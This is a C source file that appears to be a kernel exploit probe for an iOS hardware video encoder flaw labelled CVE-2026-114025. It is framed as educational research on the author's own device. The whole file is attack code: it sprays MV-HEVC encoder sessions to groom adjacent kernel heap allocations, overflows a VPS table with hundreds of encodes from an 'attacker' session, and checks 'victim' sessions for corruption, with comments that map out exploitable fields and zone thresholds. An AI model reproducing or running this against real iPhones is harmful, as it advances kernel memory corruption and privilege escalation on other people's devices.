/*
 * ave_cross_buffer.c — CVE-2026-114025 Cross-Buffer OOB Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Key insight (session 10): The inter-sub-object gap (0x4770-0x7DDC) has ZERO
 * exploitable 32-bit fields — all 64-bit pointers → DoS only. BUT the early
 * buffer region (0x0000-0x3758) has 552 exploitable 32-bit fields including
 * size/count/index fields with LDRSW patterns.
 *
 * Strategy: Overflow the SECOND VPS table (at +0x7DDC) past the buffer boundary
 * into an ADJACENT same-type HEVC buffer allocation. The adjacent buffer's
 * early region contains exploitable 32-bit fields.
 *
 * Encode count calculation:
 *   - Sub-object 2 OOB starts at entry 258 (buffer+0x8DFC)
 *   - kalloc.49152: ~353 encodes to reach adjacent buffer +0x0000. VIABLE.
 *   - kalloc.65536: ~694 encodes needed — may exceed cumsum limit. RISKY.
 *
 * This probe:
 *   1. Sprays HEVC encoder sessions to get adjacent allocations
 *   2. Uses one as "attacker" with many encodes to overflow
 *   3. Tests "victim" sessions for corruption after overflow
 *   4. Determines actual kalloc zone from crash/success patterns
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit
 *        -o AVECrossBuffer ave_cross_buffer.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avecrossbuffer
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;
static volatile int g_cb_status = -999;
static volatile int g_cb_count = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = (int)status;
    g_cb_count++;
    g_encode_done = 1;
}

static void measure_cb(void *ctx, void *src, OSStatus status,
                       VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = (int)status;
    g_cb_count++;
    g_encode_done = 1;
    if (buf && status == 0) {
        CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(buf);
        if (fmt) {
            size_t pset_count = 0;
            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fmt, 0, NULL, NULL, &pset_count, NULL);
            int total_cumsum = 0;
            for (size_t i = 0; i < pset_count && i < 10; i++) {
                const uint8_t *pset = NULL;
                size_t pset_size = 0;
                int nal_type = -1;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    fmt, i, &pset, &pset_size, NULL, &nal_type);
                int contrib = (int)(pset_size >> 3);
                total_cumsum += contrib;
                rlog("  NAL[%zu] type=%d size=%zu bytes cumsum_contrib=%d (size>>3)\n",
                     i, nal_type, pset_size, contrib);
            }
            rlog("  Total cumsum per encode: %d (of 2049 budget)\n", total_cumsum);
            if (total_cumsum > 0) {
                rlog("  Max entries before limit: %d\n", 2049 / total_cumsum);
                rlog("  Max encodes: %d\n", 2049 / total_cumsum / (int)pset_count);
            } else {
                rlog("  Cumsum contribution is ZERO — unlimited entries!\n");
            }
        }
    }
}

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static VTCompressionSessionRef create_mvhevc_session(int w, int h) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);
    if (st != noErr || !session) return NULL;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    int base = 0, layer = 1;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

static int do_encode(VTCompressionSessionRef session, int frame_idx, int w, int h) {
    CVPixelBufferRef pb = create_pb(w, h);
    if (!pb) return -1;

    g_encode_done = 0;
    g_cb_status = -999;
    CMTime pts = CMTimeMake(frame_idx, 30);
    CMTime dur = CMTimeMake(1, 30);

    OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
    if (st != noErr) {
        CVPixelBufferRelease(pb);
        return (int)st;
    }

    for (int i = 0; i < 100 && !g_encode_done; i++) usleep(10000);
    CVPixelBufferRelease(pb);
    return g_cb_status;
}

/*
 * Phase 0: Measure NAL sizes to calculate cumsum growth rate
 * This is THE critical first test — determines feasibility of cross-buffer OOB
 */
static void phase_measure_nal(int w, int h) {
    rlog("\n=== PHASE 0: Measure NAL sizes for cumsum analysis ===\n");
    rlog("If VPS/PPS < 8 bytes: cumsum_contrib = 0 → unlimited entries\n");
    rlog("If all NALs >= 8: cumsum grows ~1-3/entry → may block cross-buffer\n\n");

    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        measure_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) {
        rlog("CREATE FAILED: %d\n", (int)st);
        return;
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering,
                         kCFBooleanFalse);

    int base_id = 0, layer_id = 1;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base_id);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base_id);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        rlog("PREPARE FAILED: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    rlog("Encoding 5 frames to capture NAL sizes...\n");
    for (int i = 0; i < 5; i++) {
        CVPixelBufferRef pb = create_pb(w, h);
        if (!pb) continue;
        g_encode_done = 0;
        g_cb_status = -999;
        CMTime pts = CMTimeMake(i, 30);
        CMTime dur = CMTimeMake(1, 30);
        st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        if (st == noErr) {
            VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
            for (int j = 0; j < 100 && !g_encode_done; j++) usleep(10000);
        }
        CVPixelBufferRelease(pb);
        rlog("Frame %d: submit=%d cb=%d\n\n", i, (int)st, g_cb_status);
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

/*
 * Phase 1: Determine maximum encode count before failure
 * This tells us if we can reach cross-buffer territory
 */
static void phase_max_encodes(int w, int h) {
    rlog("\n=== PHASE 1: Maximum encode count test ===\n");
    rlog("Goal: Find how many encodes work before failure\n");
    rlog("  86 encodes = 258 entries (sub-object boundary)\n");
    rlog("  353 encodes = 1059 entries (cross-buffer if kalloc.49152)\n");
    rlog("  694 encodes = 2083 entries (cross-buffer if kalloc.65536)\n\n");

    VTCompressionSessionRef session = create_mvhevc_session(w, h);
    if (!session) {
        rlog("FAILED to create session\n");
        return;
    }

    int max_ok = 0;
    int first_error = -1;
    int first_error_code = 0;

    for (int i = 0; i < 800; i++) {
        int st = do_encode(session, i, w, h);
        if (st != 0 && st != -999) {
            if (first_error < 0) {
                first_error = i;
                first_error_code = st;
                rlog("  FIRST ERROR at frame %d (entries ~%d): status=%d\n",
                     i, i * 3, st);
            }
            if (i - first_error > 5) break;
        } else {
            max_ok = i;
        }

        if (i == 85) rlog("  [frame 85] OK — approaching sub-object boundary\n");
        if (i == 86) rlog("  [frame 86] status=%d — sub-object boundary crossed\n", st);
        if (i == 100) rlog("  [frame 100] status=%d — well past boundary\n", st);
        if (i == 200) rlog("  [frame 200] status=%d — deep OOB\n", st);
        if (i == 352) rlog("  [frame 352] status=%d — approaching kalloc.49152 cross-buffer\n", st);
        if (i == 353) rlog("  [frame 353] status=%d — kalloc.49152 cross-buffer start\n", st);
        if (i == 400) rlog("  [frame 400] status=%d — past 49152 boundary\n", st);
        if (i == 500) rlog("  [frame 500] status=%d — deep cross-buffer\n", st);
        if (i == 693) rlog("  [frame 693] status=%d — approaching kalloc.65536 cross-buffer\n", st);
        if (i == 694) rlog("  [frame 694] status=%d — kalloc.65536 cross-buffer start\n", st);
    }

    rlog("\n  MAX SUCCESSFUL ENCODE: frame %d (entries ~%d)\n", max_ok, max_ok * 3);
    if (first_error >= 0) {
        rlog("  FIRST ERROR: frame %d (entries ~%d), code=%d\n",
             first_error, first_error * 3, first_error_code);
        int entries = first_error * 3;
        if (entries >= 254 && entries <= 262)
            rlog("  ** Failure at SUB-OBJECT BOUNDARY — counter check exists?\n");
        else if (entries >= 1050 && entries <= 1070)
            rlog("  ** Failure near KALLOC.49152 BOUNDARY — buffer in kalloc.49152!\n");
        else if (entries >= 2070 && entries <= 2090)
            rlog("  ** Failure near KALLOC.65536 BOUNDARY — buffer in kalloc.65536!\n");
        else if (entries > 262 && entries < 1050)
            rlog("  ** Failure BETWEEN boundaries — unmapped memory hit\n");
    } else {
        rlog("  ** ALL 800 ENCODES SUCCEEDED — no crash, corruption is silent\n");
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

/*
 * Phase 2: Spray and cross-buffer corruption test
 * Creates N encoder sessions, overflows one, checks victims
 */
static void phase_cross_buffer(int spray_count, int attacker_idx,
                                int encode_count, int w, int h) {
    rlog("\n=== PHASE 2: Cross-buffer spray test ===\n");
    rlog("  spray=%d, attacker=%d, encodes=%d\n", spray_count, attacker_idx, encode_count);
    rlog("  Expected entries: %d (need ~1059 for kalloc.49152 cross)\n\n", encode_count * 3);

    VTCompressionSessionRef *sessions = calloc(spray_count, sizeof(VTCompressionSessionRef));
    int *alive = calloc(spray_count, sizeof(int));
    if (!sessions || !alive) { rlog("alloc failed\n"); return; }

    rlog("[1] Creating %d MV-HEVC sessions (same type → same kalloc zone)...\n", spray_count);
    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        sessions[i] = create_mvhevc_session(w, h);
        alive[i] = (sessions[i] != NULL);
        if (alive[i]) created++;
    }
    rlog("  Created %d/%d sessions\n", created, spray_count);

    if (!alive[attacker_idx]) {
        rlog("  Attacker slot %d failed\n", attacker_idx);
        goto cleanup;
    }

    rlog("[2] Verifying ALL victims can encode BEFORE attack...\n");
    int victims_ok_before = 0;
    for (int i = 0; i < spray_count; i++) {
        if (i == attacker_idx || !alive[i]) continue;
        int st = do_encode(sessions[i], 0, w, h);
        if (st == 0 || st == -999) victims_ok_before++;
        else rlog("  Victim %d pre-attack encode FAILED: %d\n", i, st);
    }
    rlog("  %d victims OK before attack\n", victims_ok_before);

    rlog("[3] ATTACKING: encoding %d frames on slot %d...\n", encode_count, attacker_idx);
    int attack_errors = 0;
    int last_ok_frame = -1;
    for (int i = 0; i < encode_count; i++) {
        int st = do_encode(sessions[attacker_idx], i, w, h);
        if (st == 0 || st == -999) {
            last_ok_frame = i;
        } else {
            attack_errors++;
            if (attack_errors == 1)
                rlog("  First attacker error at frame %d (entries ~%d): %d\n",
                     i, i * 3, st);
            if (attack_errors >= 10) {
                rlog("  Too many errors, stopping at frame %d\n", i);
                break;
            }
        }
        if ((i + 1) % 50 == 0)
            rlog("  [frame %d/%d] %d errors\n", i + 1, encode_count, attack_errors);
    }
    rlog("  Attack complete: last OK frame %d, %d errors\n", last_ok_frame, attack_errors);

    rlog("[4] Flushing attacker...\n");
    VTCompressionSessionCompleteFrames(sessions[attacker_idx], kCMTimeInvalid);
    usleep(500000);

    rlog("[5] Testing ALL victims AFTER attack...\n");
    int victims_ok_after = 0;
    int victims_crashed = 0;
    for (int i = 0; i < spray_count; i++) {
        if (i == attacker_idx || !alive[i]) continue;
        int st = do_encode(sessions[i], 1, w, h);
        if (st == 0 || st == -999) {
            victims_ok_after++;
        } else {
            victims_crashed++;
            rlog("  ** VICTIM %d CORRUPTED: encode returned %d\n", i, st);
        }
    }
    rlog("\n  RESULTS: %d ok, %d corrupted (of %d victims)\n",
         victims_ok_after, victims_crashed, victims_ok_before);

    if (victims_crashed > 0) {
        rlog("\n  *** CROSS-BUFFER CORRUPTION CONFIRMED ***\n");
        rlog("  *** %d victim sessions corrupted by %d attacker encodes ***\n",
             victims_crashed, encode_count);
        rlog("  *** This confirms adjacent allocation in same kalloc zone ***\n");
    } else if (victims_ok_before > 0 && victims_ok_after == victims_ok_before) {
        rlog("\n  ** All victims survived — either:\n");
        rlog("  ** a) Not adjacent (spray didn't achieve adjacency)\n");
        rlog("  ** b) Corruption is silent (corrupted non-critical fields)\n");
        rlog("  ** c) Not enough encodes to reach cross-buffer\n");
    }

cleanup:
    rlog("[6] Cleanup...\n");
    for (int i = 0; i < spray_count; i++) {
        if (sessions[i]) {
            VTCompressionSessionInvalidate(sessions[i]);
            CFRelease(sessions[i]);
        }
    }
    free(sessions);
    free(alive);
}

/*
 * Phase 3: Graduated spray — try increasing encode counts
 * to find the exact cross-buffer threshold
 */
static void phase_graduated(int w, int h) {
    rlog("\n=== PHASE 3: Graduated cross-buffer search ===\n");

    int test_counts[] = { 50, 100, 200, 300, 350, 360, 400, 500, 600, 700 };
    int n_tests = sizeof(test_counts) / sizeof(test_counts[0]);

    for (int t = 0; t < n_tests; t++) {
        rlog("\n--- Test %d/%d: %d encodes (%d entries) ---\n",
             t + 1, n_tests, test_counts[t], test_counts[t] * 3);
        phase_cross_buffer(16, 8, test_counts[t], w, h);
        usleep(500000);
    }
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_cross_buffer.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 Cross-Buffer OOB Probe ===\n");
    rlog("Tests cross-buffer corruption via second VPS table overflow\n");
    rlog("Target: adjacent HEVC buffer's early region (32-bit config fields)\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "help";
    int W = 128, H = 128;

    if (strcmp(mode, "measure") == 0) {
        rlog("\n== MEASURE: Dump NAL sizes to calculate cumsum growth ==\n");
        phase_measure_nal(W, H);

    } else if (strcmp(mode, "maxenc") == 0) {
        rlog("\n== MAXENC: Find maximum encode count ==\n");
        phase_max_encodes(W, H);

    } else if (strcmp(mode, "spray49") == 0) {
        rlog("\n== SPRAY49: Cross-buffer test for kalloc.49152 (~353 encodes) ==\n");
        phase_cross_buffer(16, 8, 400, W, H);

    } else if (strcmp(mode, "spray65") == 0) {
        rlog("\n== SPRAY65: Cross-buffer test for kalloc.65536 (~694 encodes) ==\n");
        phase_cross_buffer(16, 8, 750, W, H);

    } else if (strcmp(mode, "graduated") == 0) {
        rlog("\n== GRADUATED: Search for exact cross-buffer threshold ==\n");
        phase_graduated(W, H);

    } else if (strcmp(mode, "quick") == 0) {
        rlog("\n== QUICK: Small spray, 400 encodes ==\n");
        phase_cross_buffer(8, 4, 400, W, H);

    } else {
        rlog("Usage: AVECrossBuffer <mode>\n");
        rlog("  measure    -- dump NAL sizes to calc cumsum growth (RUN FIRST)\n");
        rlog("  maxenc     -- find max encode count before failure\n");
        rlog("  spray49    -- cross-buffer test for kalloc.49152\n");
        rlog("  spray65    -- cross-buffer test for kalloc.65536\n");
        rlog("  graduated  -- graduated search for cross-buffer threshold\n");
        rlog("  quick      -- quick spray test (8 sessions, 400 encodes)\n");
        rlog("\nKey thresholds:\n");
        rlog("  86 encodes (258 entries): sub-object boundary\n");
        rlog("  353 encodes (1059 entries): cross-buffer if kalloc.49152\n");
        rlog("  694 encodes (2083 entries): cross-buffer if kalloc.65536\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
